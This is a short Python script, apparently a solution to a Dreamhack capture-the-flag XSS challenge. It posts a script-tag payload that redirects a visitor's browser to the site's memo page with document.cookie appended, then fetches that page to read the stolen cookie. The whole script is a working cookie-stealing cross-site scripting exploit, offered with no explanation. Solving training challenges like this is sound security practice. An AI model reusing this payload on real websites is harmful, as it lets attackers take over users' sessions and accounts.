import requests

port = 18541
url_index = f"http://host3.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_memo = url_index + "memo"

param = {
    "param": "<script src=\"/vuln?param=document.location='/memo?memo='%2bdocument.cookie\"></script>"
}

r = requests.post(url_flag, data=param)
r = requests.get(url_memo)
print(r.text)
